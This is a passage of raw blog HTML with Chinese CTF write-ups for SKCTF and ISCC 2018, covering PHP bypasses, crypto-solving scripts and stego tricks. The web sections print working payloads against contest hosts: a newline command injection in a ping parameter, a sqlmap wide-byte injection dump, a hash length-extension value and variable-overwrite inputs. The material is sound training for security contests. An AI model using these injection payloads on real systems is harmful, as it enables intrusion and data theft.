&#39;&#x2F;([[:punct:]]+|[[:alpha:]]+|[[:digit:]]+)&#x2F;&#39;;</span><br><span class="line">        if (8 &gt; preg_match_all($rule, $data, $arr))</span><br><span class="line">        &#123;</span><br><span class="line">            echo preg_match_all($rule, $data, $arr);</span><br><span class="line">            break;</span><br><span class="line">        &#125; </span><br><span class="line">        $num &#x3D; 0;</span><br><span class="line">        $nn &#x3D; array(&#39;punct&#39;, &#39;alpha&#39;, &#39;digit&#39;);</span><br><span class="line">        foreach ($nn as $ns)</span><br><span class="line">        &#123; </span><br><span class="line">            if (preg_match(&quot;&#x2F;[[:$ns:]]+&#x2F;&quot;, $data))</span><br><span class="line">            &#123;</span><br><span class="line">                $num +&#x3D; 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($num &lt; 3)</span><br><span class="line">            break;</span><br><span class="line">        if (187667123 &#x3D;&#x3D; $data)</span><br><span class="line">        &#123;</span><br><span class="line">            $da &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">            if (!is_numeric($da))</span><br><span class="line">            &#123;</span><br><span class="line">                if(27500 &lt; $da)</span><br><span class="line">                &#123;</span><br><span class="line">                    echo $flag;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                echo &quot;Forbidden!!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; </span><br><span class="line">        else</span><br><span class="line">            echo &#39;Wrong password&#39;;</span><br><span class="line">            exit;</span><br></pre></td></tr></table></figure><p>php正则表达式的内置通用字符簇，<code>[[:punct:]]</code>代表任意标点符号，<code>[[:alpha:]]</code>代表任意字母，<code>[[:digit:]]</code>代表任意数字。</p><p><code>if (8 &gt; preg_match_all($rule, $data, $arr))</code><br>arr在data中要匹配rule条件8次以上，<strong>注意是匹配八次以上，不是八个以上的数字字母符号</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$nn &#x3D; array(&#39;punct&#39;, &#39;alpha&#39;, &#39;digit&#39;);</span><br><span class="line">foreach ($nn as $ns)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;&#x2F;[[:$ns:]]+&#x2F;&quot;, $data))&#123;</span><br><span class="line">$num +&#x3D; 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if ($num &lt; 3)</span><br><span class="line">break;</span><br></pre></td></tr></table></figure><p>这里foreach循环，就是要求的是data里面既要有数字，又要有字母，标点。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (187667123 &#x3D;&#x3D; $data)</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><p>这里要求<code>data==187667123</code>。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$da &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">if (!is_numeric($da))</span><br><span class="line">&#123;</span><br><span class="line">if(27500 &lt; $da)</span><br><span class="line">&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要求GET一个num，不是数字，而且要比25700大，可以通过弱类型绕过，比如传入<code>27599abc</code>等<br>得到payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;27599abc</span><br><span class="line">POST: data&#x3D;187667123.0e+0-0+2-2+3-3</span><br></pre></td></tr></table></figure><h1 id="Msic"><a href="#Msic" class="headerlink" title="Msic"></a>Msic</h1><h2 id="找到也打不开"><a href="#找到也打不开" class="headerlink" title="找到也打不开"></a>找到也打不开</h2><p>从数据包中提取文件，wireshark导出http对象，得到压缩包。查看16进制后得知为伪加密，7z打开，或者修改一位即解。</p><h2 id="Just-Listen"><a href="#Just-Listen" class="headerlink" title="Just Listen"></a>Just Listen</h2><p>有个password的图片，换通道可以看到密码：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180513/5a5cgkH65H.png?imageslim" alt="mark"><br>但是要注意一下：密码是forensics_is_fun不带key。</p><p>有了密码和mp3文件，想到应该是mp3加密。利用工具MP3_Stego来解，有了密码可以得到隐藏文件，一个txt。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.petitcolas.net&#x2F;steganography&#x2F;mp3stego&#x2F;</span><br></pre></td></tr></table></figure><h2 id="真香"><a href="#真香" class="headerlink" title="真香"></a>真香</h2><p>一看这个gif，很大。怀疑是有zip，可以通过winhex提取出zip。<br>但是zip不是直接能打开的，有密码，真加密（不是伪加密==、）当时没想到原来文件尾的blind_water_mark就是密码。<br>解压后，得到两张图，一张叫or，一张叫xor。</p><p>看提示，极有可能是盲水印攻击。</p><p>利用github上的盲水印攻击工具。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180513/fJEE0Adj51.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180513/6GL7Efhj7l.png?imageslim" alt="mark"></p><h2 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h2><p>首先下载下来是个虚拟镜像，于是连接，得到一个压缩包，解压是一个gif（需要用WinRAR解压，因为很多压缩软件不支持NTFS）,但是图片大小和所占空间相差很大，有猫腻！</p><p>提示是NTFS。</p><blockquote><p>NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS交换数据流。交换数据流的诞生源于Windows系统与苹果的HFS系统的交互需求，NTFS使用交换数据流来存储文件相关元数据等等。</p></blockquote><blockquote><p>ADS的作用在于，它允许一个文件携带着附加的信息。例如，IE浏览器下载文件时，会向文件添加一个数据流，标记该文件来源于外部，即带有风险，那么，在用户打开文件时，就会弹出文件警告提示。再如，在网址收藏中，也会附加一个favicon数据流以存放网站图标。</p></blockquote><p>可以利用工具lads和ntfsstreamseditor来导出数据。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180513/K6bEgaD8HC.png?imageslim" alt="mark"></p><p>又是一个gif，保存所有帧得到flag。</p><h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><p>解法一、玩游戏，但是我手残==、</p><p>解法二、反编译，下载GameMarker 8.0 Decompiler，将exe进行反编译。得到工程文件gmk，下载Gamemaker可以读取所有游戏文件资源，找到flag。<code>==、我怎么不知道</code></p><p>解法三、最人性化的解法就是修改save文件。因为玩过游戏会产生save文件，只要明白save文件的格式，修改文件即可，偏移量+12.<br>0112-&gt;011E<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180513/01Ih686Ijh.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180513/B98ialEhHA.png?imageslim" alt="mark"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="仿射加密"><a href="#仿射加密" class="headerlink" title="仿射加密"></a>仿射加密</h2><p>仿射加密，python爆就行。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">letter = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>  </span><br><span class="line">word = <span class="string">&#x27;fwpcpywpcphnxaoxlywpcphnxlhco&#x27;</span>  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">      </span><br><span class="line">a = <span class="number">11</span>  </span><br><span class="line">b = <span class="number">23</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> word:  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(letter)):  </span><br><span class="line">        <span class="keyword">if</span> i == letter[(a*j+b)%<span class="number">26</span>]:  </span><br><span class="line">            flag+=letter[j]  </span><br><span class="line"><span class="keyword">print</span> flag  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="看到的就是全部了"><a href="#看到的就是全部了" class="headerlink" title="看到的就是全部了"></a>看到的就是全部了</h2><p>常规古典题，Unicode，栅栏，凯撒。</p><h2 id="Play-Fair"><a href="#Play-Fair" class="headerlink" title="Play Fair"></a>Play Fair</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加密游戏规则：</span><br><span class="line"></span><br><span class="line"># j -&gt; i</span><br><span class="line"># 若 p1&#x3D;p2，则插入一个字母(X)于重复字母之间；</span><br><span class="line"># 若明文字母数为奇数时，则在明文的末端添加(Z)作为填充；</span><br><span class="line"></span><br><span class="line">key：just do it</span><br><span class="line">plain：playfairseemseasythanothers</span><br></pre></td></tr></table></figure><blockquote><p>play fair decode<br>矩阵按行生成<br>j-&gt;i 含义为j替代i 因此在生成的矩阵中有j无i</p></blockquote><p>play fair是一种使用一个关键词方格来加密字符对的加密法。</p><p>根据加密算法来加密就行。<br><a href="https://baike.baidu.com/item/playfair%E5%AF%86%E7%A0%81/8999814?fr=aladdin">playfair百科</a></p><p>SKCTF{rhcwgodmdbordbbutcgbmasklzdx}</p><h2 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h2><p>考察的是低指数幂的rsa攻击。</p><blockquote><p>在RSA中e也称为加密指数。由于e是可以随意选取的，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。</p><p>e=3时的小明文攻击</p><p>介绍：<br>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p></blockquote><p>由于数据很大，需要用到libnum，介绍一下<a href="https://www.cnblogs.com/pcat/p/7225782.html">安装</a>：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;hellman&#x2F;libnum</span><br><span class="line">cd libnum</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p>脚本攻击，由于知道e=3，很简单</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">n &#x3D; 127736277372703302601056543119422673263688414162130452012271136376613506149677023810059879551077756689012265602068781726322860263396788055341495459092641851239465778777954763378423777055786390661741851297248439205933852145044703803764388021585419049988085302710871206091591995497858682344782684500134395300049</span><br><span class="line">c &#x3D; 20007698782339834246219328724588364459038474898597431254441716723329047692482286669616878491497181438826429104573158490197780427343059002311390665150204203593904674308567972583524863664412573864470357485299378319457792659062998310715680020892095430469672971488726545126438904961637</span><br><span class="line"></span><br><span class="line">e&#x3D;3</span><br><span class="line"></span><br><span class="line">m &#x3D; libnum.nroot(c,e)</span><br><span class="line">flag &#x3D; libnum.n2s(m)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h2 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h2><p>hint:</p><blockquote><p>初始状态为10001，放入lfsr中移位吧<br>lfsr产生序列和Y等长，生成它<br>尝试把二进制转换为字符，flag长度为23<br>LFSR原理：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180514/bd239HCiI7.png?imageslim" alt="mark"></p></blockquote><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180514/c8gB5dLfI6.jpg?imageslim" alt="mark"><br>如图，我们可以知道Y = LFSR^FLAG，想知道flag，只要知道LFSR之前的状态即可。<br><strong>LFSR过程</strong>：<br>输出的第i个和第(i+3)个异或得到第（i+5）个数据。<br>得到LFSR过程前的结果后，将其与Y异或就可以得到flag。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">Y =<span class="string">&quot;1101110011010001000000011110111101011001010011111100000101000110011000010011000001100101101110010010001110011001011110111110100010001110111110110110011111010111110001100001101000101010&quot;</span></span><br><span class="line">len = len(Y)</span><br><span class="line"><span class="keyword">print</span> len <span class="comment"># 求得Y的长度184</span></span><br><span class="line"></span><br><span class="line">X = <span class="string">&#x27;10001&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">184</span>):</span><br><span class="line">X += str(int(X[i]) ^ int(X[i + <span class="number">3</span>]))</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;X = &quot;</span>+ X</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">184</span>):</span><br><span class="line">flag += str(int(X[i]) ^ int(Y[i]))</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;flag = &quot;</span>+flag</span><br><span class="line">list = <span class="string">&#x27;&#x27;</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> j &lt; len:</span><br><span class="line">list += chr(int(flag[j:j+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">j += <span class="number">8</span></span><br><span class="line"><span class="keyword">print</span> list</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ISCC 2018 WriteUp</title>
      <link href="/2018/05/07/ISCC2018/"/>
      <url>/2018/05/07/ISCC2018/</url>
      
        <content type="html"><![CDATA[<h1 id="ISCC-2018-WriteUp"><a href="#ISCC-2018-WriteUp" class="headerlink" title="ISCC 2018 WriteUp"></a>ISCC 2018 WriteUp</h1><hr><p>5.1开始<br>5.2更新第二批新题<br>5.5更新第三批新题</p><hr><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h2><p>文本框限长，Burp提交即可。</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>UTF-7解码，得到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+&#x2F;v+ &lt;script&gt;alert(&quot;key:&#x2F;%nsfocusXSStest%&#x2F;&quot;)&lt;&#x2F;script&gt;-</span><br></pre></td></tr></table></figure><p>flag{Hell0World}</p><h2 id="都是套路"><a href="#都是套路" class="headerlink" title="都是套路"></a>都是套路</h2><p>源码泄露（我试了好多.swp .bak .git等等，结果竟然是.txt  ==、）<br>index.php.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.&lt;?php</span><br><span class="line">2.include &quot;flag.php&quot;;</span><br><span class="line">3.if ($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; &quot;POST&quot;)</span><br><span class="line">4.die(&quot;flag is here&quot;);</span><br><span class="line">5.</span><br><span class="line">6.if (!isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">7.die($_403);</span><br><span class="line">8.foreach ($_GET as $k &#x3D;&gt; $v)&#123;</span><br><span class="line">9.$$k &#x3D; $$v;</span><br><span class="line">10.&#125;</span><br><span class="line">11.foreach ($_POST as $k &#x3D;&gt; $v)&#123;</span><br><span class="line">12.$$k &#x3D; $v;</span><br><span class="line">13.&#125;</span><br><span class="line">&#x2F;&#x2F;14.var_dump($k);</span><br><span class="line">&#x2F;&#x2F;15.var_dump($v);</span><br><span class="line">16.</span><br><span class="line">17.if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">18.die($_403);</span><br><span class="line">19.</span><br><span class="line">20.echo &quot;flag: &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">21.die($_200);</span><br><span class="line">22.</span><br><span class="line">23.?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>源码包含了flag.php文件，并且需要满足3个if里的条件才能获取flag，题目中使用了两个foreach并且也使用了$$.两个foreach中对 $$key的处理是不一样的，满足条件后会将$flag里面的值打印出来，所以$flag是在flag.php文件文件中的。 </p><p>但是由于第7，11-13行间的代码会将$flag的值给覆盖掉了，所以需要先将$flag的值赋给$_200或$_403变量，然后利用die($_200)或 die($_403)将flag打印出来。</p><h4 id="解题方法："><a href="#解题方法：" class="headerlink" title="解题方法："></a>解题方法：</h4><p>由于第7，11-13行间的代码会将$flag的值给覆盖掉，所以只能利用第一个foreach先将$flag的值赋给$_200，然后利用die($_200)将原本的flag值打印出来。</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>GET： ?_200=flag<br>POST: flag=</p><h2 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h2><p>伪造IP</p><p>X-Forwarded-For不行<br>用<br>Client-IP: 127.0.0.1</p><h2 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h2><p>得到源码index.php.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &quot;***********&quot;;</span><br><span class="line">if(isset($_GET[&#39;username&#39;]))&#123;</span><br><span class="line">if (0 &#x3D;&#x3D; strcasecmp($flag,$_GET[&#39;username&#39;]))&#123;</span><br><span class="line">$a &#x3D; fla;</span><br><span class="line">echo &quot;very good!Username is right&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">print &#39;Username is not right&lt;!--index.php.txt--&gt;&#39;;&#125;</span><br><span class="line">&#125;else</span><br><span class="line">print &#39;Please give me username or password!&#39;;</span><br><span class="line">if (isset($_GET[&#39;password&#39;]))&#123;</span><br><span class="line">if (is_numeric($_GET[&#39;password&#39;]))&#123;</span><br><span class="line">if (strlen($_GET[&#39;password&#39;]) &lt; 4)&#123;</span><br><span class="line">if ($_GET[&#39;password&#39;] &gt; 999)&#123;</span><br><span class="line">$b &#x3D; g;</span><br><span class="line">print &#39;&lt;p&gt;very good!Password is right&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;else </span><br><span class="line">print &#39;&lt;p&gt;Password too little&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;else</span><br><span class="line">print &#39;&lt;p&gt;Password too long&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;else</span><br><span class="line">print &#39;&lt;p&gt;Password is not numeric&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if ($a.$b &#x3D;&#x3D; &quot;flag&quot;)</span><br><span class="line">print $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>容易理解：<br>strcasecmp($username,$flag)==0,php弱类型strcmp数组绕过，<br>strlen($password)&lt;4&amp;&amp;$password&gt;999<br>科学计数法绕过</p><p>由此得到payload：</p><pre><code>username[]=[1,2,3]&amp;password=1e8</code></pre><blockquote><p>strcmp和strcasecmp类似<br>区别在于：strcmp区分大小写，strcasecmp不区分大小写</p></blockquote><h2 id="ping-IP"><a href="#ping-IP" class="headerlink" title="ping IP"></a>ping IP</h2><p><a href="http://118.190.152.202:8018/">http://118.190.152.202:8018</a></p><blockquote><p>请ping我的IP 看你会ping通吗</p></blockquote><p>?id=xx.xx.xx.xx 然后会返回ping该IP的结果。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180504/I6HcAfLJ5a.png?imageslim" alt="mark"></p><p>想到命令执行， 但是有过滤&amp; 用%0a 绕过就行。</p><p>payload:<br>118.190.152.202:8018/?ip=118.190.152.202 %0A ls</p><h2 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h2><p>id=1时：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180504/Af8h4dg3DL.png?imageslim" alt="mark"></p><p>id=1’,不变，说明有过滤</p><p>id=1%df%27,页面变了，可能是gbk编码导致的宽字节注入，但是没有回显，需要用盲注。</p><p>补了一波盲注姿势。</p><p> python2 sqlmap.py -u “http:<br>//118.190.152.202:8015/index.php?id=1%DF%27” –dump -D baji -T admins -C flag</p><p>Y0u_@@33w_dxxmn_9rf0Od</p><h2 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h2><p>hash扩展长度攻击<br>username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin<br>verify=5f585093a7fe86971766c3d25c43d0eb</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180505/21Jl5eAjB3.png?imageslim" alt="mark"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h2><p>向下的手指图片，提示我们flag在下面，于是winhex修改高度，拉高得到flag：<br>Flag={_Welcome_To_ISCC_2018_}</p><h2 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h2><p>培根密码</p><h2 id="Where-is-the-FLAG？"><a href="#Where-is-the-FLAG？" class="headerlink" title="Where is the FLAG？"></a>Where is the FLAG？</h2><p>二维码拼图了解一下==、<br>flag{a332b700-3621-11e7-a53b-6807154a58cf}</p><h2 id="暴力xx不可取"><a href="#暴力xx不可取" class="headerlink" title="暴力xx不可取"></a>暴力xx不可取</h2><p>伪加密</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vfppjrnerpbzvat</span><br></pre></td></tr></table></figure><p>凯撒解密（rot13）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">isccwearecoming</span><br></pre></td></tr></table></figure><h2 id="猫的心思"><a href="#猫的心思" class="headerlink" title="猫的心思"></a>猫的心思</h2><p>jpg文件以  FFD9 结束。<br>文件改成doc。</p><p>了解一下  <a href="http://keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a>==、</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180502/4m33B61b5H.png?imageslim" alt="mark"></p><p>16进制<br>base32<br>base64<br>混合</p><p>F1a9_is_I5cc_ZOl8_G3TP01NT</p><h2 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h2><blockquote><p>凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。</p></blockquote><p>rot13得到<br>roqtp697t95j3</p><p>对应键盘的下面一行，如r对f，o对l<br>得：<br>flag:yougotme</p><h2 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h2><p>这是一道脑洞题，简单的要命。层层迷雾之后就是答案，刹那便是永恒。南无阿弥陀佛。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Vm0wd2QyVkZOVWRXV0doVlYwZG9WVll3WkRSV2JGbDNXa1JTVjAxWGVGWlZNakExVjBaS2RHVkljRnBXVm5CUVZqQmtTMUl4VG5OaFJtUlhaV3RHTkZkWGRHdFRNVXB6V2toV2FsSnNjRmhhVjNoaFYxWmFjMWt6YUZSTlZtdzBWVEo0YzJGR1NuTlhiR2hYWVd0d2RsUnRlR3RqYkdSMFVteFdUbFp0ZHpCV2EyTXhVekZSZUZkc1ZsZGhlbXhoVm01d1IyTldjRVZTYlVacVZtdHdlbGRyVlRWVk1ERldZMFZ3VjJKR2NIWlpWRXBIVWpGT1dXSkhhRlJTVlhCWFZtMDFkMUl3TlhOVmJGcFlZbGhTV1ZWcVFURlRWbEY0VjIxR2FGWnNjSGxaYWs1clZqSkdjbUo2UWxwV1JWcDZWbXBHVDJNeGNFaGpSazVZVWxWd1dWWnRNVEJXTVUxNFdrVmtWbUpHV2xSWlZFNVRWVVpzYzFadVpGUmlSbHBaVkZaU1ExWlhSalpTYTJSWFlsaENVRll3V21Gak1XUnpZVWRHVTFKV2NGRldha0poV1ZkU1YxWnVTbEJXYldoVVZGUktiMDB4V25OYVJFSm9UVlpXTlZaSE5VOVdiVXB5WTBaYVdtRXhjRE5aTW5oVFZqRmFkRkpzWkU1V2JGa3dWbXhrTUdFeVJraFRiRnBYWVd4d1dGWnFUbE5YUmxsNVRWVmFiRkp0VW5wWlZWcFhZVlpLZFZGdWJGZGlXRUpJV1ZSS1QxWXhTblZWYlhoVFlYcFdWVmRYZUZOamF6RkhWMjVTYWxKWVVrOVZiVEUwVjBaYVNFNVZPVmRXYlZKS1ZWZDRhMWRzV2taWGEzaFhUVlp3V0ZwR1pFOVRSVFZZWlVkc1UyRXpRbHBXYWtvd1lURkplRmR1U2s1V1ZscHdWVzB4VTFac1duUk5WazVPVFZkU1dGZHJWbXRoYXpGeVRsVndWbFl6YUZoV2FrWmhZekpPUjJKR1pGTmxhMVYzVjJ0U1IyRXhUa2RWYmtwb1VtdEtXRmxzWkc5a2JHUllaRVprYTJKV1ducFhhMXB2Vkd4T1NHRklRbFZXTTJoTVZqQmFZVk5GTlZaa1JscFRZbFpLU0ZaSGVGWmxSbHBYVjJ0YVQxWldTbFpaYTFwM1dWWndWMXBHWkZSU2EzQXdXVEJWTVZZeVNuSlRWRUpYWWtad2NsUnJXbHBsUmxweVdrWm9hVkpzY0ZsWFYzUnJWVEZaZUZkdVVtcGxhMHB5VkZaYVMxZEdXbk5oUnpsWVVteHNNMWxyVWxkWlZscFhWbGhvVjFaRldtaFdha3BQVWxaU2MxcEhhRTVpUlc4eVZtdGFWMkV4VVhoYVJXUlVZa2Q0Y1ZWdGRIZGpSbHB4VkcwNVZsWnRVbGhXVjNSclYyeGFjMk5GYUZkaVIyaHlWbTB4UzFaV1duSlBWbkJwVW14d2IxZHNWbUZoTWs1elZtNUtWV0pHV2s5V2JHaERVMVphY1ZKdE9XcE5WbkJaVld4b2IxWXlSbk5UYldoV1lURmFhRlJVUm1GamJIQkhWR3hTVjJFelFqVldSM2hoWVRGU2RGTnJXbXBTVjFKWVZGWmFTMUpHYkhGU2JrNVlVbXR3ZVZkcldtdGhWa2w1WVVjNVYxWkZTbWhhUkVaaFZqRldjMWRzWkZoU01taFFWa1phWVdReFNuTldXR3hyVWpOU2IxVnRkSGRXYkZwMFpVaE9XbFpyY0ZsV1YzQlBWbTFXY2xkdGFGWmlXRTE0Vm0xNGExWkdXbGxqUms1U1ZURldObFZyVGxabGJFcENTbFJPUlVwVVRrVSUzRA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64 解</p><p>解到解不了的时候，AES无密码解密（==、很坑没遇见过）<br>然后是与佛论禅==、</p><p>flag是  把我复制走  ==、当时懵了以为自己解错了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SKCTF2</title>
      <link href="/2018/04/21/SKCTF2-wp/"/>
      <url>/2018/04/21/SKCTF2-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="SKCTF-组内CTF2"><a href="#SKCTF-组内CTF2" class="headerlink" title="SKCTF 组内CTF2"></a>SKCTF 组内CTF2</h1><hr><h1 id="NOT-GET-Score"><a href="#NOT-GET-Score" class="headerlink" title="NOT GET Score"></a>NOT GET Score</h1><h2 id="Crypto-Streamgame1"><a href="#Crypto-Streamgame1" class="headerlink" title="Crypto-Streamgame1"></a>Crypto-Streamgame1</h2><p>这道题，我想到暴力求解，但是无奈脚本写错，加上之前做不出来的焦躁，没做出来，很难受。。。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>给出了加密过程：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flag import flag</span><br><span class="line">assert flag.startswith(&quot;flag&#123;&quot;)</span><br><span class="line">assert flag.endswith(&quot;&#125;&quot;)</span><br><span class="line">assert len(flag)&#x3D;&#x3D;25</span><br><span class="line"></span><br><span class="line">def lfsr(R,mask):</span><br><span class="line">    output &#x3D; (R &lt;&lt; 1) &amp; 0xffffff</span><br><span class="line">    i&#x3D;(R&amp;mask)&amp;0xffffff</span><br><span class="line">    lastbit&#x3D;0</span><br><span class="line">    while i!&#x3D;0:</span><br><span class="line">        lastbit^&#x3D;(i&amp;1)</span><br><span class="line">        i&#x3D;i&gt;&gt;1</span><br><span class="line">    output^&#x3D;lastbit</span><br><span class="line">    return (output,lastbit)</span><br><span class="line"></span><br><span class="line">R&#x3D;int(flag[5:-1],2)          #将flag明文转换成对应的二进制</span><br><span class="line">mask    &#x3D;   0b1010011000100011100#mask</span><br><span class="line"></span><br><span class="line">f&#x3D;open(&quot;key&quot;,&quot;ab&quot;)#ab,二进制方式打开追加</span><br><span class="line">for i in range(12):</span><br><span class="line">    tmp&#x3D;0</span><br><span class="line">    for j in range(8):</span><br><span class="line">        (R,out)&#x3D;lfsr(R,mask)#其实根本不用管加密过程</span><br><span class="line">        tmp&#x3D;(tmp &lt;&lt; 1)^out</span><br><span class="line">    f.write(chr(tmp))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>我们需要模拟加密过程，因为明文是19位，每位都是0或1，所以，模拟过程，最多只需要2**19次模拟。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def lfsr(R,mask):</span><br><span class="line">    output &#x3D; (R &lt;&lt; 1) &amp; 0xffffff</span><br><span class="line">    i&#x3D;(R&amp;mask)&amp;0xffffff</span><br><span class="line">    lastbit&#x3D;0</span><br><span class="line">    while i!&#x3D;0:</span><br><span class="line">        lastbit^&#x3D;(i&amp;1)</span><br><span class="line">        i&#x3D;i&gt;&gt;1</span><br><span class="line">    output^&#x3D;lastbit</span><br><span class="line">    return (output,lastbit)</span><br><span class="line">mask &#x3D; 0b1010011000100011100</span><br><span class="line"></span><br><span class="line">f&#x3D;open(&quot;key&quot;,&quot;rb&quot;)</span><br><span class="line">c&#x3D;f.read()#二进制读取key</span><br><span class="line">f.close()</span><br><span class="line">count &#x3D; -1</span><br><span class="line"></span><br><span class="line">while count &lt;&#x3D; 2**19:</span><br><span class="line">    count +&#x3D; 1</span><br><span class="line">    #print(count)</span><br><span 